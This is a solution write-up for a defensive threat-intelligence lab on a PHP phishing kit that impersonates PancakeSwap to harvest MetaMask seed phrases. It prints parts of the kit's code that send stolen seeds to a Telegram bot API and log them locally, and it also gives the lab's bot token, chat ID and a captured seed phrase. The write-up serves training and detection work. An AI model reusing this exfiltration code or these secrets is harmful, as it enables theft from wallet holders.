# GrabThePhisher Lab

ategory: [Threat Intel](https://cyberdefenders.org/blueteam-ctf-challenges/?categories=threat-intel)

Tactics: [Initial Access](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=initial-access)[Exfiltration](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=exfiltration)

Tool: [Text Editor](https://cyberdefenders.org/blueteam-ctf-challenges/?tools=text-editor)

**Scenario**

A decentralized finance (DeFi) platform recently reported multiple user complaints about unauthorized fund withdrawals. A forensic review uncovered a phishing site impersonating the legitimate PancakeSwap exchange, luring victims into entering their wallet seed phrases. The phishing kit was hosted on a compromised server and exfiltrated credentials via a Telegram bot.

Your task is to conduct threat intelligence analysis on the phishing infrastructure, identify indicators of compromise (IoCs), and track the attacker’s online presence, including aliases and Telegram identifiers, to understand their tactics, techniques, and procedures (TTPs).

#### Which wallet is used for asking the seed phrase?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FF8irWEvx8rxgOTggjAYv%2FScreenshot%202025-10-07%20at%207.54.48%E2%80%AFPM.png?alt=media&#x26;token=7578e00a-8efa-4b70-80a0-7645114e601c" alt=""><figcaption></figcaption></figure>

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FEErQKizMSTGeGQAewNPm%2FScreenshot%202025-10-07%20at%207.53.48%E2%80%AFPM.png?alt=media&#x26;token=e67d0b79-4c32-454b-98db-a2eb89bccec4" alt=""><figcaption></figcaption></figure>

Answer **`Metamask`**

#### What is the file name that has the code for the phishing kit?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FSbzX73MJmvLfcRge1j9Q%2FScreenshot%202025-10-07%20at%207.55.54%E2%80%AFPM.png?alt=media&#x26;token=6d501503-87d8-4cc4-b827-1d350e097762" alt=""><figcaption></figcaption></figure>

**Locate the phishing kit’s main PHP files**\
Inside the kit’s directory, look for files like `metamask.php`,

1. When you open **`metamask.php`**, you can see text such as:

   ```php
   Wallet: Metamask
   ```

   and a section of code that handles user input.
2. **Check how the data is processed**\
   The code includes a line like:

   ```php
   $data = $_POST['data'];
   ```

   which means it collects the seed phrase entered by the victim.
3. **Confirm exfiltration**\
   The same file uses a function such as:

   ```php
   sendTel($data);
   ```

   This shows the stolen data (the seed phrase) is sent to a Telegram bot.
4. **Check logging**\
   It also writes the collected data to a local file:

   ```php
   file_put_contents("log/log.txt", $data);
   ```

**Conclusion:**\
The phishing kit specifically asks for the **MetaMask wallet seed phrase** using the `metamask.php` script.

Answer **`metamask.php`**

In which language was the kit written?

The phishing kit is written in **PHP** — the provided file (`metamask.php`) is a server-side PHP script that processes the posted seed phrase, logs it, and calls the Telegram API.&#x20;

Answe **`php`**

#### What service does the kit use to retrieve the victim's machine information?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FtwCHDAyzXfj8nxeCStTI%2FScreenshot%202025-10-07%20at%208.01.02%E2%80%AFPM.png?alt=media&#x26;token=86e718ec-1d28-436e-9447-249addc05e8b" alt=""><figcaption></figcaption></figure>

```php
$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']);
$array = json_decode($request);
$geo = $array->country->name_en;
$city = $array->city->name_en;
```

**What it does:** the script sends the victim’s IP (`$_SERVER['REMOTE_ADDR']`) to `api.sypexgeo.net/json/<IP>` and decodes the JSON response to extract the country and city.

**Note:** this is passive enrichment (geolocation) and can be detected in logs as outbound HTTP requests to `api.sypexgeo.net`.

Answer **`sypexgeo`**\\

#### How many seed phrases were already collected?

**3** seed phrases were collected — each is a 12-word seed phrase.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FG9bOLilPXfHBJW6Llz9i%2FScreenshot%202025-10-07%20at%208.04.54%E2%80%AFPM.png?alt=media&#x26;token=7fb7d998-a2b8-49e3-8de4-4c1c6b6d75cf" alt=""><figcaption></figcaption></figure>

* There are **3** lines (3 seed phrases).
* Each line contains **12 words** (typical BIP‑39 seed length).
* The most recent entry is line **3**:\
  `father also recycle embody balance concert mechanic believe owner pair muffin hockey`

Answer **`3`**

#### Could you please provide the seed phrase associated with the most recent phishing incident?

Answer **`father also recycle embody balance concert mechanic believe owner pair muffin hockey`**

#### Which medium was used for credential dumping?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2F39ogJHnONJU2rlZos8ZR%2FScreenshot%202025-10-07%20at%208.10.29%E2%80%AFPM.png?alt=media&#x26;token=ba64c430-6384-4322-85cc-7f416c885a7b" alt=""><figcaption></figcaption></figure>

**Two mediums** were used for credential dumping:

1. **Immediate (real‑time) exfiltration via Telegram bot** — the script builds a `https://api.telegram.org/bot<token>/sendMessage?...` request and calls `file_get_contents()` to push the stolen seed to the attacker’s Telegram channel.
2. **Local backup logging** — the script appends the stolen seed to a local file (`log/log.txt`) using `file_put_contents(..., FILE_APPEND)`.

**Evidence (from the PHP you showed):**

* `file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?...")` → Telegram exfil.
* `@file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);` → local log backup.

**Immediate recommendations**

* Isolate the host (cut or restrict outbound to `api.telegram.org`), preserve the `log.txt` and `metamask.php` with hashes, and search backups/webroots for other occurrences of `api.telegram.org`, `log.txt`, or `metamask.php`.
* Add detections for HTTP calls to `api.telegram.org` originating from webservers and YARA/grep rules to find `file_put_contents(...log.txt...)` and Telegram token patterns.

Answer **`Telegram`**\\

#### What is the token for accessing the channel?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2F5y1sJn1d03tRVdwjmJoL%2FScreenshot%202025-10-07%20at%208.10.29%E2%80%AFPM.png?alt=media&#x26;token=bba40e22-8d6c-43f2-b056-04638699d33e" alt=""><figcaption></figcaption></figure>

Answer **`5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10`**\\

#### What is the Chat ID for the phisher's channel?

Answer **`5442785564`**

#### What are the allies of the phish kit developer?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FrMPSJSc01Xizo0ZErBsv%2FScreenshot%202025-10-07%20at%208.15.35%E2%80%AFPM.png?alt=media&#x26;token=f8d86b4c-7db9-44b8-bf15-23a33d835df2" alt=""><figcaption></figcaption></figure>

The kit names one ally in a code comment: **`j1j1b1s@m3r0`**.

Evidence: that string appears in the comment block at the top of `metamask.php` (the “With love and respect…” comment).

Answer **`j1j1b1s@m3r0`**.

#### What is the full name of the Phish Actor?

The full name of the phishing actor, as retrieved via the Telegram `getChat` API using the bot token and chat ID, is:

**Answer `Marcus Aurelius`**\\

#### What is the username of the Phish Actor?

Answer **`pumpkinboii`**\
\
\
\
[https://cyberdefenders.org/blueteam-ctf-challenges/achievements/Napol/grabthephisher/ \
](https://cyberdefenders.org/blueteam-ctf-challenges/achievements/Napol/grabthephisher/)\
\
\
\\
